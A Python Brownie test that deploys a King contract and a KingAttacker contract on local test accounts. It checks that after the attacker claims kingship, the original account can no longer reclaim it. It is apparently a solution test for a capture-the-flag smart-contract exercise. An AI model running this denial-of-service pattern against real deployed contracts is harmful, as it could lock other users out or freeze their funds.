import brownie
from hexbytes import HexBytes


def deploy_king():
    return brownie.King.deploy({"from": brownie.accounts[0], "value": 10})


def deploy_king_attacker(king_contract_address: str, value: int):
    return brownie.KingAttacker.deploy(
        king_contract_address, {"from": brownie.accounts[1], "value": value}
    )


def test_attack():
    # Deploy King
    king = deploy_king()
    assert king.balance() == 10
    assert king.prize() == 10
    current_king = brownie.network.web3.eth.get_storage_at(king.address, 0).hex()[-40:]
    assert current_king == HexBytes(brownie.accounts[0].address).hex()[-40:]

    # Deploy KingAttacker
    king_attacker = deploy_king_attacker(king.address, 100)
    assert king_attacker.balance() == 100

    # Claim King
    king_attacker.claimKing(40)

    # Try to reclaim back (fails)
    with brownie.reverts():
        brownie.accounts[0].transfer(king.address, amount=2)
